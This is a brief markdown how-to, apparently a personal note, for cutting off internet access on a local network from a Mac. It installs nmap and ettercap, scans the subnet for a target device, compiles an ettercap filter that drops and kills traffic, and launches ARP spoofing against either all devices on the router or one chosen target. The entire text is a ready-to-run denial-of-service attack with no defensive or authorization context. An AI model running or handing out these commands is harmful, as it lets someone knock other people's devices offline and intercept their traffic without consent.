# Block internet connection

## On Mac

- Install homebrew: [https://brew.sh/](https://brew.sh/)
- Install packages:
    - `brew install nmap ettercap`
- Find the ***router IP address*** using: `netstat -nr|grep default`The IP address will be next to the first **default** word
- Find the IP address of the targeted device: `sudo nmap -sP <router-ip-address>/24` For example `sudo nmap -sP 192.168.1.1/24`
- Create an “etter” file with these commands
    - `echo "drop();" >> etter`
    - `echo "kill();" >> etter`
- Run this command to compile to etter.ef file: `etterfilter etter -o etter.ef`
- Now run this to start blocking network:
    - Block the network of all devices using the router (including yours): `sudo ettercap -T -q -p -F etter.ef -M arp:remote /// ///`
    - Block the targeted device: `sudo ettercap -T -q -p -F etter.ef -M arp:remote /<router-ip-address>// /<target-ip-address>//` For example: `sudo ettercap -T -q -p -F etter.ef -M arp:remote /192.168.1.1// /192.168.1.91//`